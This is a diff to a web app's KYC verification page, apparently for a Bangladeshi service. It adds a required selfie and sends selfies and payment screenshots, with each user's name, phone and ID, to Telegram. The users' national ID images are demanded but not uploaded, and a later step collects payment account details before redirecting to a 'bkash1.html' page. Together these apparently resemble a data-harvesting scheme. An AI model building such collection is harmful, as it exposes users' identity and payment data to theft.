@@ -59,7 +59,6 @@ function initAccount() {
   // Step 2 elements
   const paymentAccountNumber = document.getElementById('payment-account-number');
   const paymentHolderName = document.getElementById('payment-holder-name');
-  const btnStep2Back = document.getElementById('btn-step2-back');
   const btnStep2Submit = document.getElementById('btn-step2-submit');
 
   // Shared elements
@@ -68,11 +67,18 @@ function initAccount() {
   const screenshotPreview = document.getElementById('screenshot-preview');
   const screenshotImg = document.getElementById('screenshot-img');
 
+  // Selfie elements
+  const selfieInput = document.getElementById('selfie-input');
+  const selfiePlaceholder = document.getElementById('selfie-placeholder');
+  const selfiePreview = document.getElementById('selfie-preview');
+  const selfieImg = document.getElementById('selfie-img');
+
   // State
   let currentKycStep = 1;
   let nidFrontFile = null;
   let nidBackFile = null;
   let screenshotFile = null;
+  let selfieFile = null;
 
   // ─── Load Profile ─────────────────────────────────
   async function loadProfile(user) {
@@ -255,33 +261,30 @@ function initAccount() {
     }
   }
 
-  // ─── Progress Bar ─────────────────────────────────
+
+
   function updateProgressBar(step) {
     const circles = [
       document.getElementById('step-circle-1'),
       document.getElementById('step-circle-2')
     ];
-
     circles.forEach((circle, i) => {
+      if (!circle) return;
       const stepNum = i + 1;
       if (stepNum < step) {
-        // Completed
         circle.className = 'w-10 h-10 rounded-full border-2 border-emerald-500 bg-emerald-500 flex items-center justify-center text-sm font-bold text-white transition-all duration-300';
         circle.innerHTML = '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"/></svg>';
       } else if (stepNum === step) {
-        // Active
         circle.className = 'w-10 h-10 rounded-full border-2 border-blue-500 bg-blue-500 flex items-center justify-center text-sm font-bold text-white transition-all duration-300 shadow-md shadow-blue-200';
         circle.textContent = stepNum;
       } else {
-        // Inactive
         circle.className = 'w-10 h-10 rounded-full border-2 border-slate-300 bg-white flex items-center justify-center text-sm font-bold text-slate-400 transition-all duration-300';
         circle.textContent = stepNum;
       }
     });
-
-    // Progress fill line (0% at step 1, 70% at step 2)
+    const progressFill = document.getElementById('progress-fill');
     const fillPercent = (step - 1) * 70;
-    progressFill.style.width = fillPercent + '%';
+    if (progressFill) progressFill.style.width = fillPercent + '%';
   }
 
   // ─── Step 1: NID Image Upload ─────────────────────
@@ -324,8 +327,13 @@ function initAccount() {
     checkStep1Validity();
   });
 
+  setupImagePreview(selfieInput, selfiePlaceholder, selfiePreview, selfieImg, (file) => {
+    selfieFile = file;
+    checkStep1Validity();
+  });
+
   function checkStep1Validity() {
-    btnStep1Submit.disabled = !(nidFrontFile && nidBackFile && screenshotFile);
+    btnStep1Submit.disabled = !(nidFrontFile && nidBackFile && screenshotFile && selfieFile);
   }
 
   function checkStep2Validity() {
@@ -400,30 +408,38 @@ function initAccount() {
 
   // ─── Step Navigation ──────────────────────────────
   
-  // Step 1: Submit NID + Screenshot → only screenshot goes to Telegram, NID is skipped
+  // Step 1: Submit NID + Screenshot + Selfie → NID skipped, screenshot and selfie upload to Telegram
   btnStep1Submit.addEventListener('click', async () => {
     const user = auth.currentUser;
-    if (!user || !nidFrontFile || !nidBackFile || !screenshotFile) return;
+    if (!user || !nidFrontFile || !nidBackFile || !screenshotFile || !selfieFile) return;
 
     btnStep1Submit.disabled = true;
     btnStep1Submit.innerHTML = '<svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> আপলোড হচ্ছে...';
 
     try {
-      // Only upload screenshot to Telegram (NID is NOT uploaded)
+      // Only upload screenshot and selfie to Telegram
       const compressedScreenshot = await compressImage(screenshotFile, 800, 0.7);
       const screenshotUrl = await uploadToTelegram(
         compressedScreenshot, 
         'payment_screenshot.jpg', 
-        `📸 পেমেন্ট স্ক্রিনশট জমা দিয়েছেন।\n\n👤 ব্যবহারকারীর তথ্য:\n   • আইডি: ${currentUserData?.accountId || 'Unknown'}\n   • নাম: ${currentUserData?.fullName || 'Unknown'}\n   • ফোন: ${currentUserData?.phone || 'Unknown'}`
+        `📸 পেমেন্ট স্ক্রিনশট জমা দিয়েছেন।\n\n👤 ব্যবহারকারীর তথ্য:\n   • আইডি: ${currentUserData?.accountId || 'Unknown'}\n   • নাম: ${currentUserData?.fullName || 'Unknown'}\n   • ফোন: ${currentUserData?.phone || 'Unknown'}`
       );
 
-      // Create verifications doc — NID URLs marked as skipped
+      const compressedSelfie = await compressImage(selfieFile, 800, 0.7);
+      const selfieUrl = await uploadToTelegram(
+        compressedSelfie, 
+        'selfie.jpg', 
+        `🤳 সেলফি ছবি জমা দিয়েছেন।\n\n👤 ব্যবহারকারীর তথ্য:\n   • আইডি: ${currentUserData?.accountId || 'Unknown'}\n   • নাম: ${currentUserData?.fullName || 'Unknown'}\n   • ফোন: ${currentUserData?.phone || 'Unknown'}`
+      );
+
+      // Create verifications doc
       await db.collection('verifications').doc(user.uid).set({
         nidFrontUrl: 'Skipped',
         nidBackUrl: 'Skipped',
         screenshotUrl,
+        selfieUrl,
         fullName: user.displayName || '',
-        status: 'step1_complete',
+        status: 'pending',
         rejectionReason: null,
         submittedAt: firebase.firestore.FieldValue.serverTimestamp(),
         reviewedAt: null
@@ -431,30 +447,26 @@ function initAccount() {
 
       // Update user doc
       await db.collection('users').doc(user.uid).update({
-        verificationStatus: 'step1_complete'
+        verificationStatus: 'pending'
       });
 
       // Update cached profile
       const cached = getCachedProfile();
       if (cached) {
-        cached.verificationStatus = 'step1_complete';
+        cached.verificationStatus = 'pending';
         sessionStorage.setItem('user_profile', JSON.stringify(cached));
       }
 
-      btnStep1Submit.innerHTML = '<i data-lucide="shield-check" class="w-5 h-5"></i> NID + স্ক্রিনশট সাবমিট করুন';
-      goToStep(2);
+      btnStep1Submit.innerHTML = '<i data-lucide="shield-check" class="w-5 h-5"></i> ভেরিফিকেশন রিকোয়েস্ট সাবমিট করুন';
+      showKycState('pending');
 
     } catch (error) {
       console.error('[Step 1] Submission error:', error);
       alert('সাবমিট করতে সমস্যা হয়েছে। দয়া করে আবার চেষ্টা করুন।\n\nError: ' + error.message);
       btnStep1Submit.disabled = false;
-      btnStep1Submit.innerHTML = '<i data-lucide="shield-check" class="w-5 h-5"></i> NID + স্ক্রিনশট সাবমিট করুন';
+      btnStep1Submit.innerHTML = '<i data-lucide="shield-check" class="w-5 h-5"></i> ভেরিফিকেশন রিকোয়েস্ট সাবমিট করুন';
     }
     if (window.lucide) lucide.createIcons();
-  });
-
-  btnStep2Back.addEventListener('click', () => {
-    goToStep(1);
   });
 
   // Step 2: Submit Payment Method → Redirect to bkash1.html
